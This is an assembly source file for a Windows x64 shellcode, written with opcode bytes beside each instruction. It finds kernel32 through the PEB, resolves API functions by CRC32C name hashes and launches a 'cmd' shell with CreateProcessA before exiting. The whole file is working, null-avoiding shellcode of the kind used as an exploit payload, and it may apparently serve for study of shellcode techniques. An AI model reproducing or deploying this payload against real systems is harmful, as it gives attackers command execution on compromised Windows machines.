    .section .shcode, "ax"
/* MinGW entrypoint is either mainCRTStartup or WinMainCRTStartup */
    .globl mainCRTStartup
    .def mainCRTStartup; .scl 2; .type 32; .endef
    .set mainCRTStartup, _start
    .globl WinMainCRTStartup
    .def WinMainCRTStartup; .scl 2; .type 32; .endef
    .set WinMainCRTStartup, _start
    .globl _start
    .def _start; .scl 2; .type 32; .endef
_start:
    /* fc                */  cld                            /* Clear direction flag */
    /* eb 64             */  jmp    trampoline_start        /* Make relative calls negative */

/* Call the function in kernel32 identified by hash in eax
 * Parameters: rcx, rdx, r8, r9, stack
 */
call_by_hash:
    /* 55                */  push   %rbp                    /* Save registers */
    /* 51                */  push   %rcx                    /* Please note that r10 is */
    /* 52                */  push   %rdx                    /*   modified, which breaks ABI */
    /* 56                */  push   %rsi
    /* 57                */  push   %rdi
    /* 31 c0             */  xor    %eax, %eax
    /* 65 48 8b 40 60    */  mov    %gs:0x60(%rax), %rax
    /* 48 8b 40 18       */  mov    0x18(%rax), %rax        /* rax = PEB->Ldr */
    /* 48 8b 70 10       */  mov    0x10(%rax), %rsi        /* rsi = Ldr->InLoadOrderModuleList.Flink */
    /* 48 ad             */  lods   %ds:(%rsi), %rax        /* Next module (ntdll) */
    /* 48 89 c6          */  mov    %rax, %rsi
    /* 48 ad             */  lods   %ds:(%rsi), %rax        /* Next module (kernel32) */
    /* 48 8b 68 30       */  mov    0x30(%rax), %rbp        /* rbp = rax->DllBase */
    /* 8b 75 3c          */  mov    0x3c(%rbp), %esi        /* esi = IMAGE_DOS_HEADER->e_lfanew */
    /* 83 c6 40          */  add    $0x40, %esi             /* Avoid an offset > 127 */
    /* 44 8b 54 35 48    */  mov    0x48(%rbp, %rsi, 1), %r10d
                                                            /* r10d = MAGE_NT_HEADERS->OptionalHeader */
                                                            /*   .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT] */
                                                            /*   .VirtualAddress */
    /* 49 01 ea          */  add    %rbp, %r10              /* r10 = IMAGE_EXPORT_DIRECTORY - 0x10 to avoid a 0x20 */
    /* 49 83 ea 10       */  sub    $0x10, %r10
    /* 41 8b 4a 28       */  mov    0x28(%r10), %ecx        /* ecx = r10->NumberOfNames */
    /* 41 8b 7a 30       */  mov    0x30(%r10), %edi        /* edi = r10->AddressOfNames */
    /* 48 01 ef          */  add    %rbp, %rdi
_find_function:
    /* 67 e3 27          */  jecxz  _not_found              /* do int3 if function is not found */
    /* ff c9             */  dec    %ecx
    /* 8b 34 8f          */  mov    (%rdi, %rcx, 4), %esi   /* Compute CRC32C: */
    /* 48 01 ee          */  add    %rbp, %rsi              /*   rsi = name */
    /* 31 c0             */  xor    %eax, %eax              /*   rax = current char/bit index */
    /* 31 d2             */  xor    %edx, %edx              /*   edx = hash */
                                                            /*   ebx = hash to be found */
                                                            /*   ecx, rdi, rbp, r10: assigned */
_compute_hash_loop:
    /* ac                */  lods   %ds:(%rsi), %al
    /* 84 c0             */  test   %al, %al
    /* 74 17             */  je     _hash_finished
    /* 30 c2             */  xor    %al, %dl
    /* b0 08             */  mov    $0x8, %al
_compute_hash_bit:
    /* d1 ea             */  shr    %edx
    /* 73 06             */  jae    _skip_xor
    /* 81 f2 78 3b f6 82 */  xor    $0x82f63b78, %edx       /* Reversed Castagnoli polynomial */
_skip_xor:
    /* fe c8             */  dec    %al
    /* 75 f2             */  jne    _compute_hash_bit
    /* eb e7             */  jmp    _compute_hash_loop

/* Trampoline to jump to start using 1-byte relative offsets */
trampoline_start:
    /* eb 24             */  jmp    start

_not_found:
    /* cc                */  int3

_hash_finished:
    /* 39 da             */  cmp    %ebx, %edx              /* Compare hashes */
    /* 75 d1             */  jne    _find_function          /* Loop back to _find_function */

    /* 41 8b 7a 34       */  mov    0x34(%r10), %edi        /* edi = r10->AddressOfNameOrdinals */
    /* 48 01 ef          */  add    %rbp, %rdi
    /* 66 8b 04 4f       */  mov    (%rdi, %rcx, 2), %ax    /* Convert rcx to ordinal ax */
    /* 41 8b 72 2c       */  mov    0x2c(%r10), %esi        /* esi = r10->AddressOfFunctions */
    /* 48 01 ee          */  add    %rbp, %rsi
    /* 8b 04 86          */  mov    (%rsi, %rax, 4), %eax
    /* 48 01 e8          */  add    %rbp, %rax              /* rax = function address */
    /* 5f                */  pop    %rdi                    /* Restore saved registers */
    /* 5e                */  pop    %rsi
    /* 5a                */  pop    %rdx
    /* 59                */  pop    %rcx
    /* 5d                */  pop    %rbp
    /* ff e0             */  jmpq   *%rax                   /* Jump to found function */

start:
    /* b8 01 63 6d 64    */  mov    $0x646d6301, %eax
    /* c1 e8 08          */  shr    $0x8, %eax
    /* 50                */  push   %rax                    /* Push "cmd" */
    /* 48 89 e2          */  mov    %rsp, %rdx              /* args(lpCommandLine) = rsp */
    /* 83 e4 f0          */  and    $0xfffffff0, %esp       /* align stack on 16 bytes */
    /* 31 c9             */  xor    %ecx, %ecx              /* ecx = args(lpApplicationName) = 0 */
    /* b1 d0             */  mov    $0xd0, %cl              /* Allocate 208 bytes for: */
    /* 48 29 cc          */  sub    %rcx, %rsp              /*   PROCESS_INFORMATION (24) */
    /* 48 89 e7          */  mov    %rsp, %rdi              /*   STARTUPINFO (104) */
    /* 31 c0             */  xor    %eax, %eax              /*   10 arguments (80) */
    /* f3 aa             */  rep stos %al, %es:(%rdi)       /* ZeroMemory */
    /* 48 8d 74 24 50    */  lea    0x50(%rsp), %rsi        /* rsi = &STARTUPINFO */
    /* c6 46 d0 01       */  movb   $0x1, -0x30(%rsi)       /* args(bInheritHandles) = TRUE */
    /* c6 06 68          */  movb   $0x68, (%rsi)           /* rsi->cbSize = 104 */
    /* 48 89 74 24 40    */  mov    %rsi, 0x40(%rsp)        /* args(lpStartupInfo) = rsi */
    /* 48 83 c6 68       */  add    $0x68, %rsi             /* rsi = &PROCESS_INFORMATION */
    /* 48 89 74 24 48    */  mov    %rsi, 0x48(%rsp)        /* args(lpProcessInformation) = rsi */
    /* c6 44 24 28 10    */  movb   $0x10, 0x28(%rsp)       /* args(dwCreationFlags) = CREATE_NEW_CONSOLE */
    /* 4d 31 c0          */  xor    %r8, %r8                /* args(lpProcessAttributes) = NULL */
    /* 4d 31 c9          */  xor    %r9, %r9                /* args(lpThreadAttributes) = NULL */
    /* bb 24 05 1a 7a    */  mov    $0x7a1a0524, %ebx       /* Call CreateProcessA */
    /* e8 2a ff ff ff    */  callq  call_by_hash
    /* 6a ff             */  pushq  $0xffffffffffffffff
    /* 5a                */  pop    %rdx                    /* args(dwMilliseconds) = INFINITE */
    /* 48 8b 4f e8       */  mov    -0x18(%rdi), %rcx       /* args(hHandle) = hProcess */
    /* bb 76 51 94 d8    */  mov    $0xd8945176, %ebx       /* Call WaitForSingleObject */
_exit_loop:
    /* e8 19 ff ff ff    */  callq  call_by_hash
    /* 31 c9             */  xor    %ecx, %ecx              /* args(uExitCode) = 0 */
    /* bb d5 a5 c9 42    */  mov    $0x42c9a5d5, %ebx       /* Call ExitProcess */
    /* eb f2             */  jmp    _exit_loop
